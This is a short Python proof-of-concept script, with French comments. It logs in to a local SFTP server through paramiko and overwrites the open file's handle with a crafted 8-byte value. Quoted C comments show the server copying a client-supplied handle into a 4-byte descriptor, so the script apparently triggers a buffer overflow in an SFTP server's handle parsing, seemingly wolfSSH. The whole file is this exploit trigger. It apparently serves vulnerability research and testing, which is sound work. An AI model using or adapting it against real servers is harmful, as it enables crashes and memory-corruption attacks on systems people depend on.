import paramiko
from math import pow
from struct import pack

hostname = "127.0.0.1"
port = 22222
username = "jill"
password = "upthehill"

# Cr√©er un client SFTP
transport = paramiko.Transport((hostname, port))
transport.connect(username=username, password=password)
sftp = paramiko.SFTPClient.from_transport(transport)

with sftp.open("./test.txt", "w") as f:
    # WMEMSET((byte*)&fd, 0, sizeof(WFD));
    # WMEMCPY((byte*)&fd, data + idx, sz); idx += sz;
    # sz = size of handle 
    # WFD = file descriptor size = 4
    # Here we're sending a handle of 8 bytes 
    f.handle = b'\x00\x00\x00\x00\xCA\xFE\xBA\xBE'

    # Just some minimal writes
    f.write("a" * 2)

# Fermer la connexion
sftp.close()
transport.close()
